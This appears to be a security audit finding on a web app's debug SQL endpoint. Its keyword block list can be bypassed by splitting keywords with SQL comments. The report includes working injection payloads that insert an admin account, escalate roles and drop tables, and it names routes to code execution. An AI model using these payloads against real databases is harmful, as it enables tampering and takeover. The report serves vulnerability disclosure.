---
id: longshot-16201ecf-001
phase: X2
anchor: apps/web/src/routes/api/debug/sql/+server.ts
slug: comment-injection-sqli-bypass
severity: high
confidence: high
---

## Summary

The `validateSqlQuery` function in `debug-helpers.ts` uses `\b` word-boundary regex matching on an uppercased query string to block dangerous SQL keywords (INSERT, UPDATE, DELETE, DROP, ALTER, TRUNCATE, CREATE). An attacker can bypass this check by inserting a SQL comment (`/**/`) between the letters of a dangerous keyword—e.g., `IN/**/SERT` instead of `INSERT`. JavaScript's `\bINSERT\b` regex fails to match the fractured token, but PostgreSQL strips the `/**/` comment before parsing and executes `INSERT` normally. Combined with node-postgres's support for stacked (multi-statement) queries, this allows arbitrary DML and DDL execution through the `/api/debug/sql` endpoint: an attacker can insert, update, delete, drop, alter, truncate, or create any database object the application's database user has privileges for.

## Location

- `apps/web/src/lib/server/debug-helpers.ts:69-94` — `validateSqlQuery` function with flawed `\b` regex
- `apps/web/src/routes/api/debug/sql/+server.ts:36` — `d.execute(sql`${sql.raw(query)}`)` sink
- `apps/web/src/hooks.server.ts:6-12` — auth gate (not bypassed, but provides context)

## Attacker Control

The attacker sends a POST request to `/api/debug/sql` with a JSON body:

```json
{
  "sql": "SELECT 1; IN/**/SERT INTO users (email, password_hash) VALUES ('attacker@evil.com', 'hash')--"
}
```

- **Entry point**: `apps/web/src/routes/api/debug/sql/+server.ts:14-16` — `request.json()` parses the body, extracts `body.sql`
- **Attacker supplies**: the full `sql` string
- **Prerequisite**: must possess the `DEBUG_API_TOKEN` bearer token (validated at the SvelteKit hook level)

## Trust Boundary Crossed

The `/api/debug/sql` endpoint is designed as a **read-only** debug facility. The `validateSqlQuery` function is the sole defense-in-depth control meant to enforce the "SELECT-only" contract at the application layer. By bypassing this validation, the attacker crosses from a restricted read-only boundary into full read/write database access—subverting the entire security model of the debug API.

## Impact

- **Data exfiltration**: arbitrary `SELECT` on any table (users, sessions, flight data, etc.)
- **Data modification**: `INSERT`, `UPDATE`, `DELETE` on any table the DB user can access
- **Schema destruction**: `DROP TABLE`, `TRUNCATE`, `ALTER TABLE`
- **Persistence**: `CREATE TABLE`, `CREATE FUNCTION` — attacker can plant backdoors (e.g., trigger-based exfiltration)
- **Potential RCE escalation**: with `CREATE FUNCTION` (bypassed via `CRE/**/ATE FUNCTION`), the attacker could create PostgreSQL functions in untrusted languages if extensions like `plpythonu` are enabled, or use `COPY TO PROGRAM` if superuser

## Evidence

### 1. The `validateSqlQuery` regex uses `\b` word boundaries (debug-helpers.ts:86-90)

```typescript
// apps/web/src/lib/server/debug-helpers.ts:86-90
const upperQuery = query.toUpperCase();
for (const keyword of DANGEROUS_KEYWORDS) {
    if (new RegExp(`\\b${keyword}\\b`).test(upperQuery)) {
        return { valid: false, error: `Dangerous keyword "${keyword}" detected...` };
    }
}
```

`DANGEROUS_KEYWORDS` is defined at line 71:
```typescript
// apps/web/src/lib/server/debug-helpers.ts:71
const DANGEROUS_KEYWORDS = ['INSERT', 'UPDATE', 'DELETE', 'DROP', 'ALTER', 'TRUNCATE', 'CREATE'];
```

### 2. Comment injection breaks `\b` matching

When the query `SELECT 1; IN/**/SERT INTO users...` is uppercased to `SELECT 1; IN/**/SERT INTO USERS...`, the regex `\bINSERT\b` scans character-by-character:

- `IN` ends at `N` (word char), followed by `/` (non-word char) → word boundary exists between `N` and `/`
- `/**/` are all non-word characters
- `SERT` starts at `S` (word char), preceded by `/` (non-word) → word boundary exists between `/` and `S`
- The regex never sees the contiguous string `INSERT` → **no match**
- PostgreSQL strips `/**/` (it's a block comment) and parses `INSERT` normally

The test suite confirms this gap — no test case covers comment-injection:
```typescript
// apps/web/src/lib/debug-comprehensive.test.ts — no comment-injection tests exist
```

### 3. `sql.raw()` is a raw passthrough (drizzle-orm)

```javascript
// node_modules/drizzle-orm/sql/sql.js:302-304
function raw(str) {
    return new SQL([new StringChunk(str)]);
}
```

`StringChunk` stores the value as-is and concatenates it literally into the final query string (line 84-86):
```javascript
if (is(chunk, StringChunk)) {
    return { sql: chunk.value.join(""), params: [] };
}
```

### 4. node-postgres supports stacked queries

The Drizzle session delegates to `client.query(rawQuery, params)` (session.js:110-112), which is the pg `Pool.query()` method. PostgreSQL's wire protocol supports multiple statements in a single query string separated by `;`.

## Exploit Sketch

1. Obtain the `DEBUG_API_TOKEN` (discovery is out of scope; assume it leaks via logs, config, or environment)
2. Send POST to `/api/debug/sql` with `Authorization: Bearer <token>` header
3. Body: `{"sql": "SELECT 1; IN/**/SERT INTO users (email, password_hash, name) VALUES ('admin@evil.com', '$2b$...', 'admin') RETURNING *--"}`
4. The validation passes: first token `SELECT` is allowed; no dangerous keyword is detected by regex
5. PostgreSQL executes both `SELECT 1` (returns result) and the `INSERT` (modifies users table)
6. Response returns the SELECT result; the INSERT succeeds silently

Variants for other operations:
- **UPDATE**: `SELECT 1; UP/**/DATE users SET role='admin' WHERE email='target@example.com'--`
- **DELETE**: `SELECT 1; DEL/**/ETE FROM flights--`
- **DROP**: `SELECT 1; DRO/**/P TABLE audit_log--`
- **CREATE**: `SELECT 1; CRE/**/ATE TABLE backdoor (cmd text)--`

## Open Questions

- **Token rotation**: Is `DEBUG_API_TOKEN` rotated regularly, or is it a static value baked into deployment config? A static token increases the window of exploitation after a leak.
- **Database user privileges**: Does the application's database user have superuser or `pg_write_server_files` / `pg_execute_server_program` role? If so, `COPY TO PROGRAM` could achieve direct RCE without needing `CREATE FUNCTION`.
- **Audit logging**: Does the `console.log` at line 42 (`apps/web/src/routes/api/debug/sql/+server.ts:42`) feed into a SIEM or alerting system that would detect anomalous queries?
